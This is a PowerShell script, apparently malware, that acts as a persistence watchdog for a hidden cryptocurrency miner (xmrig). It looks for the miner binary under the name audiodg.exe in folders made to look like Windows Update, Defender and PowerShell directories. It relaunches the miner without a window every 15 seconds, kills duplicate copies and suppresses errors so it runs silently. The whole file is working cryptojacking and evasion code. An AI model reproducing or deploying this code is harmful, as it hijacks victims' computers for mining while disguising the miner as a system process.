# ================================================================================================
# PERSISTENT WATCHDOG - Runs independently in background
# ================================================================================================

# Set to run silently
$ErrorActionPreference = "SilentlyContinue"

# Logging function
function Write-WatchdogLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logPath = "$env:TEMP\watchdog.log"
    "[$timestamp] $Message" | Out-File -FilePath $logPath -Append
}

Write-WatchdogLog "WATCHDOG STARTED"

# Configuration
$minerLocations = @(
    "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe",
    "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\audiodg.exe",
    "C:\ProgramData\Microsoft\Network\Downloader\audiodg.exe",
    "$env:USERPROFILE\AppData\Local\Microsoft\Windows\PowerShell\audiodg.exe",
    "$env:USERPROFILE\AppData\Local\Microsoft\Windows\Defender\audiodg.exe",
    "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Templates\audiodg.exe",
    "$env:USERPROFILE\AppData\Local\Temp\WindowsUpdateCache\audiodg.exe"
)

# Find miner
function Get-MinerPath {
    foreach ($loc in $minerLocations) {
        if (Test-Path $loc) {
            return $loc
        }
    }
    return $null
}

# Check if miner is running
function Get-MinerProcess {
    $procs = @()
    $procs += Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    $procs += Get-Process -Name "audiodg" -ErrorAction SilentlyContinue | Where-Object {
        $_.Path -like "*Windows*" -or $_.Path -like "*AppData*"
    }
    return $procs
}

# Start miner
function Start-Miner {
    param([string]$MinerPath)
    
    $configPath = Join-Path (Split-Path $MinerPath) "config.json"
    
    if (-not (Test-Path $configPath)) {
        Write-WatchdogLog "ERROR: Config not found at $configPath"
        return $false
    }
    
    try {
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $MinerPath
        $processInfo.Arguments = "--config=`"$configPath`""
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        $processInfo.WorkingDirectory = Split-Path $MinerPath
        
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
        if ($process) {
            Write-WatchdogLog "Miner started successfully (PID: $($process.Id))"
            return $true
        }
    } catch {
        Write-WatchdogLog "ERROR starting miner: $($_.Exception.Message)"
    }
    
    return $false
}

# Main watchdog loop
Write-WatchdogLog "Entering monitoring loop..."

while ($true) {
    try {
        # Check for miner process
        $miners = Get-MinerProcess
        
        if ($miners.Count -eq 0) {
            # No miner running - restart it
            Write-WatchdogLog "NO MINER DETECTED - AUTO-RESTARTING"
            
            $minerPath = Get-MinerPath
            if ($minerPath) {
                Start-Miner -MinerPath $minerPath
            } else {
                Write-WatchdogLog "ERROR: No miner binary found in any location"
            }
        }
        elseif ($miners.Count -gt 1) {
            # Multiple miners - kill duplicates
            Write-WatchdogLog "MULTIPLE MINERS DETECTED ($($miners.Count)) - Killing duplicates"
            
            $bestMiner = $miners | Sort-Object WorkingSet -Descending | Select-Object -First 1
            
            foreach ($miner in $miners) {
                if ($miner.Id -ne $bestMiner.Id) {
                    Write-WatchdogLog "Killing duplicate PID: $($miner.Id)"
                    $miner | Stop-Process -Force
                }
            }
        }
        else {
            # One miner running - check if it's healthy
            $miner = $miners[0]
            
            # Ensure priority is maintained
            try {
                if ($miner.PriorityClass -ne [System.Diagnostics.ProcessPriorityClass]::Normal) {
                    $miner.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Normal
                }
            } catch {}
        }
        
    } catch {
        Write-WatchdogLog "Watchdog error: $($_.Exception.Message)"
    }
    
    # Sleep for 15 seconds
    Start-Sleep -Seconds 15
}
